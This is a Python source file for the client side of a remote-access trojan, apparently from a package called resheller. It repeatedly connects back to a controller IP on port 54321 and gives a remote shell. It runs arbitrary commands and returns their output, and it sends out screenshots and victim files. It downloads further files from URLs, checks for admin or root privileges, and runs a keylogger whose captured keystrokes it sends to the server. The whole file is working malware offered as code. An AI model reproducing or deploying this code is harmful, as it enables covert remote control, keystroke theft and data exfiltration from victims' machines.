#!/usr/bin/env python3
"""reverse_shell"""
from base64 import b64encode
from os import name, environ, listdir, path, remove, chdir
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE
from threading import Thread
from time import sleep
from typing import Union

from mss import mss
from requests import get

from resheller.lib.pipe import SafeSocket
from resheller.lib.stdout import usage
from resheller.src.client.ip import get_ip
from resheller.src.client.keylogger import KeyLogger


class ReverseShell(KeyLogger):
    """Initiate backdoor and socket variable"""

    def __init__(self) -> None:
        super().__init__()
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.safe_sock = SafeSocket(self.sock)

    def connect(self) -> None:
        """Attempt to connect to the server"""
        while True:
            sleep(20)
            try:
                self.sock.connect((get_ip(), 54321))
                self.shell()
            except ConnectionRefusedError:
                self.connect()

    def is_admin(self) -> None:
        """Return admin status to server"""
        payload = "[!] Cannot Perform Check\n"
        try:
            if name == "nt":
                try:
                    system_root = environ.get("SystemRoot", "C:\\Windows")
                    listdir(path.sep.join([system_root, "temp"]))
                    payload = "[+] Running as Admin"
                except PermissionError:
                    payload = "[!] Running as User"
            else:
                try:
                    # noinspection PyUnresolvedReferences
                    import os.geteuid

                    if os.geteuid() == 0:
                        payload = "[+] Running as root"
                    else:
                        payload = "[!] Running as user"
                except ImportError:
                    pass
        except ValueError:
            pass
        self.safe_sock.send(payload)

    def screenshot(self) -> None:
        """Take a screenshot on target machine and send it back to
        server
        """
        try:
            with mss() as screenshot:
                screenshot.shot()
            with open("monitor-1.png", "rb") as image:
                image = b64encode(image.read())
                payload = image.decode("utf-8")
            remove("monitor-1.png")
        except ValueError:
            payload = "\n[!] Failed to Take Screenshot\n"
        self.safe_sock.send(payload)

    def download(self, command: str) -> None:
        """Download a file onto target from server

        :param command: The item to download from server
        """
        with open(command[9:], "rb") as file:
            result = b64encode(file.read())
            payload = result.decode("utf-8")
            self.safe_sock.send(payload)

    def get_request(self, command: str) -> None:
        """Download a file onto target from the web

        :param command: The item to download from the web
        """
        try:
            url = command[4:]
            get_response = get(url)
            file_name = url.split("/")[-1]
            with open(file_name, "wb") as out_file:
                out_file.write(get_response.content)
            payload = f'[+] Downloaded "{file_name} to Target'
        except ValueError:
            payload = "[!] Failed to Downloaded File"
        self.safe_sock.send(payload)

    def start(self, command: str) -> None:
        """Open a process on the target machine

        :param command: The process to execute
        """
        try:
            Popen(command[6:], shell=True)
            payload = f"[+] Started {command[6:]}"
        except ValueError:
            payload = f"[!] Failed to Start {command[6:]}"
        self.safe_sock.send(payload)

    def return_stdout(self, command: str) -> None:
        """Return stdout to the server

        :param command: The command that will result in the output
        """
        proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout = proc.stdout.read() + proc.stderr.read()
        payload = stdout.decode("utf-8")
        self.safe_sock.send(payload)

    def keylogger(self, command: str) -> None:
        """Start the keylogger or return the logs to the server

        :param command: Command to start or return logs
        """
        if command[10:] == "start":
            thread = Thread(target=self.listen)
            thread.start()
            payload = "[+] Started Keylogger"
        elif command[10:] == "dump":
            payload = "[!] No Logs Found\n"
            if path.isfile(self.log_path):
                with open(self.log_path) as log_file:
                    payload = log_file.read()
                    log_file.close()
                remove(self.log_path)
        else:
            payload = usage(session=False, keylogger=True)
        self.safe_sock.send(payload)

    def change_dir(self, command: str) -> None:
        """Run the cd command to navigate the target machine

        :param command: cd <target dir>
        """
        try:
            chdir(command[3:])
            payload = "[+]"
        except (FileNotFoundError, OSError):
            payload = "[!] Directory Not Found"
        self.safe_sock.send(payload)

    def shell(self) -> Union[str, None]:
        """The reverse shell process

        :return: Stdout for commands such as `ls` and None for others
        """
        windows = name == "nt"
        while True:
            command = self.safe_sock.recv()
            if command == "get_os":
                self.safe_sock.send(windows)
            elif command == "exit":
                self.sock.close()
                break
            elif command[:2] == "cd" and len(command) > 2:
                if command == "cd ~":
                    command = f"cd {path.expanduser('~')}"
                self.change_dir(command)
            elif command[:8] == "download":
                self.download(command)
            elif command[:7] == "get_url":
                self.get_request(command)
            elif command == "screenshot":
                self.screenshot()
            elif command[:5] == "start":
                self.start(command)
            elif command[:5] == "check":
                self.is_admin()
            elif command[:9] == "keylogger":
                self.keylogger(command)
            elif command == "help":
                return usage()
            else:
                self.return_stdout(command)
